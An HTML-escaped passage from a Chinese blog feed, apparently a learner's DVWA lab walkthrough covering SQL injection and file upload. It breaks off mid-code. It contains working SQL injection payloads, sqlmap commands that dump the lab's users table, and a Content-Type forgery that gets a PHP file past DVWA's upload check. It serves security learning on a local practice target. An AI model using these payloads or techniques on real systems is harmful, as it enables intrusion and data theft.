&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;ID: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$id&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;br /&amp;gt;First name: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$first&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;br /&amp;gt;Surname: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$last&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">((&lt;/span>&lt;span class="nx">is_null&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="k">false&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="nv">$___mysqli_res&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">SQLITE&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="c1">// 略 ...
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>立刻注意到 &lt;code>$_SESSION['id']&lt;/code>，所以这个难度的注入点在会话信息中。此时考虑一个情况：会话保存在哪儿？Cookies 还是服务端？&lt;/p>
&lt;p>如果保存在服务端，那么此处就没有注入的可能，因为无法控制&lt;code>$_SESSION['id']&lt;/code>的值。先看一眼 Cookies 里有没有。&lt;/p>
&lt;blockquote>
&lt;p>事后反省：我又傻逼了。那个弹出的窗口就是让你控制 &lt;code>$_SESSION['id']&lt;/code>的。&lt;/p>
&lt;p>删除一段胡乱分析的内容。&lt;/p>
&lt;/blockquote>
&lt;p>&amp;hellip;.总之，先试试&lt;code>'&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427151241418.png"
width="521"
height="243"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427151241418_hu9e6afd571627e65157bd0ea1c6914aae_13769_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427151241418_hu9e6afd571627e65157bd0ea1c6914aae_13769_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427151241418"
class="gallery-image"
data-flex-grow="214"
data-flex-basis="514px"
>&lt;/p>
&lt;p>很好，还是有注入的。&lt;/p>
&lt;p>接着试一试 Low 难度的 payload：&lt;code>' or 1=1 --&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427151343515.png"
width="408"
height="325"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427151343515_hu2769a150c5b6a4c878a2eaf3d044c857_9585_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427151343515_hu2769a150c5b6a4c878a2eaf3d044c857_9585_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427151343515"
class="gallery-image"
data-flex-grow="125"
data-flex-basis="301px"
>&lt;/p>
&lt;p>好了，我觉得不用继续了，剩下无非是把 Low 难度的 payload 重复一遍。&lt;/p>
&lt;h3 id="sqlmap">sqlmap&lt;/h3>
&lt;p>手工注入成功之后可以尝试下自动工具了。&lt;code>sqlmap&lt;/code> 是一个非常著名的自动SQL注入工具，这里拿 sqlmap 玩一玩。&lt;/p>
&lt;p>直接在虚拟机里安装 sqlmap &lt;code>sudo apt install -y sqlmap&lt;/code>，然后开始。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">sqlmap -u &lt;span class="s1">&amp;#39;http://localhost/vulnerabilities/sqli/?id=1&amp;amp;Submit=Submit#&amp;#39;&lt;/span> --cookie &lt;span class="s1">&amp;#39;PHPSESSID=9nmb4p6uqpf33edc0gvt0s38k5; security=low&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>经过一大串输出和询问如何测试之后，得到下面的报告：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">sqlmap identified the following injection point(s) with a total of 147 HTTP(s) requests:
---
Parameter: id (GET)
Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
Payload: id=1&amp;#39; OR NOT 4667=4667#&amp;amp;Submit=Submit
Type: error-based
Title: MySQL &amp;gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
Payload: id=1&amp;#39; AND EXTRACTVALUE(2744,CONCAT(0x5c,0x7170786b71,(SELECT (ELT(2744=2744,1))),0x71627a7171))-- HCVJ&amp;amp;Submit=Submit
Type: time-based blind
Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP)
Payload: id=1&amp;#39; AND (SELECT 7426 FROM (SELECT(SLEEP(5)))bhNh)-- bKjP&amp;amp;Submit=Submit
Type: UNION query
Title: MySQL UNION query (NULL) - 2 columns
Payload: id=1&amp;#39; UNION ALL SELECT NULL,CONCAT(0x7170786b71,0x64687569466e4454474c614e644e7543524f49417450684b547a506d65756c54576e56466255644a,0x71627a7171)#&amp;amp;Submit=Submit
---
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>sqlmap&lt;/code> 发现 &lt;code>id&lt;/code> 脆弱而且列出了三种攻击方式和对应的 payload，这里我使用的是 &lt;code>UNION query&lt;/code>法，前面所说的稳定的1比特观察窗口就是 &lt;code>boolean-based blind&lt;/code>，一种盲注攻击法。因为1比特的观察窗口虽然稳定但真的太小了，所以一般靠这个盲注的时候都是拿脚本跑（如上所示，比如用&lt;code>sqlmap&lt;/code>来跑）。&lt;/p>
&lt;p>更让人感到惊喜的是甚至给出了&lt;code>id&lt;/code>可能可以用于反射型XSS，可以说非常牛逼了。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">heuristic (XSS) test shows that GET parameter &amp;#39;id&amp;#39; might be vulnerable to cross-site scripting (XSS) attacks
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>通过添加参数还可以枚举出更多信息。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">sqlmap -u &lt;span class="s1">&amp;#39;http://localhost/vulnerabilities/sqli/?id=1&amp;amp;Submit=Submit#&amp;#39;&lt;/span> --cookie &lt;span class="s1">&amp;#39;PHPSESSID=9nmb4p6uqpf33edc0gvt0s38k5; security=low&amp;#39;&lt;/span> --dbs --tables --columns
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427153558093.png"
width="1119"
height="709"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427153558093_hu37dcf5cebdc4dfb37dd7d8c84cf425bd_630384_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427153558093_hu37dcf5cebdc4dfb37dd7d8c84cf425bd_630384_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427153558093"
class="gallery-image"
data-flex-grow="157"
data-flex-basis="378px"
>&lt;/p>
&lt;p>一键列出表名和字段名！&lt;/p>
&lt;p>然后我们直接用 sqlmap 列出 &lt;code>dvwa.users&lt;/code> 这个表的内容。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">sqlmap -u &lt;span class="s1">&amp;#39;http://localhost/vulnerabilities/sqli/?id=1&amp;amp;Submit=Submit#&amp;#39;&lt;/span> --cookie &lt;span class="s1">&amp;#39;PHPSESSID=9nmb4p6uqpf33edc0gvt0s38k5; security=low&amp;#39;&lt;/span> -D dvwa -T users --dump
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427153909726.png"
width="1371"
height="439"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427153909726_huee70106b164173b84d6e3d22dbf95277_726586_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427153909726_huee70106b164173b84d6e3d22dbf95277_726586_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427153909726"
class="gallery-image"
data-flex-grow="312"
data-flex-basis="749px"
>&lt;/p>
&lt;p>完成。之后可能再专门学一学 sqlmap 可以怎么玩，DVWA 确实是个好靶场。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>SQL注入还算是熟悉一点，毕竟上初中那会儿就玩过了，就是那时候不懂事根本没细看。可惜了年轻的自己就是个傻逼啊。&lt;/p>
&lt;p>SQL注入没什么可总结的，熟悉SQL之后DVWA这种简单的注入是信手拈来的事情，连源码都给了，注不进去才奇怪。之后研究sqlmap的时候可能再看看都有什么注入技巧，说不定也是可以迁移到其他地方的。&lt;/p></description></item><item><title>DVWA上手记录-文件上传</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-05/</link><pubDate>Wed, 27 Apr 2022 12:00:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-05/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>快速过一下文件上传。老写一大串没用的这次简洁点。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;ol>
&lt;li>文件传到服务器上了。&lt;/li>
&lt;li>没做好文件类型过滤和执行权限的控制，传上来的文件包含恶意代码。&lt;/li>
&lt;/ol>
&lt;p>上传的恶意文件被执行，于是寄。&lt;/p>
&lt;h2 id="解题">解题&lt;/h2>
&lt;h3 id="收集信息">收集信息&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160039663.png"
width="683"
height="170"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160039663_hue5286accd807ff7366ef6801710a85b8_9725_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160039663_hue5286accd807ff7366ef6801710a85b8_9725_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426160039663"
class="gallery-image"
data-flex-grow="401"
data-flex-basis="964px"
>&lt;/p>
&lt;p>一个文件上传表单，提示选择图片上传。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160116588.png"
width="609"
height="267"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160116588_hu0ba2627541bb845650f402518a23d6c4_26033_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160116588_hu0ba2627541bb845650f402518a23d6c4_26033_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426160116588"
class="gallery-image"
data-flex-grow="228"
data-flex-basis="547px"
>&lt;/p>
&lt;p>点击选择文件发现前端就没过滤文件类型。随便选了个文件上传。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160207958.png"
width="503"
height="205"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160207958_hu572c7079dce176180ca2a8e7feb14b8e_10173_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160207958_hu572c7079dce176180ca2a8e7feb14b8e_10173_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426160207958"
class="gallery-image"
data-flex-grow="245"
data-flex-basis="588px"
>&lt;/p>
&lt;p>&amp;hellip;行，直接寄了。&lt;/p>
&lt;h3 id="low难度">Low难度&lt;/h3>
&lt;p>看一眼代码，没有任何防护，逻辑清晰：取文件名，拼接到上传位置，然后把临时文件移动过去。就这样。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">
&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Upload&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Where are we going to be writing to?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">DVWA_WEB_PAGE_TO_ROOT&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s2">&amp;#34;hackable/uploads/&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$target_path&lt;/span> &lt;span class="o">.=&lt;/span> &lt;span class="nx">basename&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Can we move the file to the upload folder?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nx">move_uploaded_file&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;tmp_name&amp;#39;&lt;/span> &lt;span class="p">],&lt;/span> &lt;span class="nv">$target_path&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// No
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Yes!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$target_path&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2"> succesfully uploaded!&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>直接传一个 php 文件也不会拦，所以直接传个上去。就刚才的 1.php 好了。然后访问。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160503041.png"
width="1219"
height="351"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160503041_hu6f6561036a3ff7b7c05ab535fdf8f827_46824_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160503041_hu6f6561036a3ff7b7c05ab535fdf8f827_46824_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426160503041"
class="gallery-image"
data-flex-grow="347"
data-flex-basis="833px"
>&lt;/p>
&lt;p>成功。&lt;/p>
&lt;h3 id="medium难度">Medium难度&lt;/h3>
&lt;p>前端没变化，看源码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Upload&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Where are we going to be writing to?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">DVWA_WEB_PAGE_TO_ROOT&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s2">&amp;#34;hackable/uploads/&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$target_path&lt;/span> &lt;span class="o">.=&lt;/span> &lt;span class="nx">basename&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// File information
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$uploaded_name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$uploaded_type&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;type&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$uploaded_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;size&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Is it an image?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_type&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;image/jpeg&amp;#34;&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nv">$uploaded_type&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;image/png&amp;#34;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_size&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">100000&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Can we move the file to the upload folder?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nx">move_uploaded_file&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;tmp_name&amp;#39;&lt;/span> &lt;span class="p">],&lt;/span> &lt;span class="nv">$target_path&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// No
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Yes!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$target_path&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2"> succesfully uploaded!&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Invalid file
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded. We can only accept JPEG or PNG images.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>主要变化出现在 &lt;code>if( ( $uploaded_type == &amp;quot;image/jpeg&amp;quot; || $uploaded_type == &amp;quot;image/png&amp;quot; ) &amp;amp;&amp;amp; ( $uploaded_size &amp;lt; 100000 ) )&lt;/code> 这段代码。&lt;code>uploaded_type&lt;/code> 是 &lt;code>$_FILES['uploaded']['type']&lt;/code>，查文档可知&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160910787.png"
width="1037"
height="92"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160910787_hue3efa660b46003a1cf4a113fe65bb9e4_21339_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160910787_hue3efa660b46003a1cf4a113fe65bb9e4_21339_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426160910787"
class="gallery-image"
data-flex-grow="1127"
data-flex-basis="2705px"
>&lt;/p>
&lt;p>类型信息是由浏览器提供的，因此可以选择自己构造一个文件上传请求，改掉 Content-Type 之后发出去。偷懒直接把 Low 难度下的文件上传请求右键复制 fetch 出来（edge/chrome 对 &lt;code>multipart/form-data&lt;/code> 的请求不能复制出请求体，这一步只能用火狐），把复制出来的命令的 &lt;code>body&lt;/code> 里：&lt;/p>
&lt;ol>
&lt;li>&lt;code>Content-Type&lt;/code> 改成 &lt;code>image/jpeg&lt;/code>。&lt;/li>
&lt;li>文件名改成 &lt;code>2.php&lt;/code>，以区别于 Low 难度下的 &lt;code>1.php&lt;/code>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
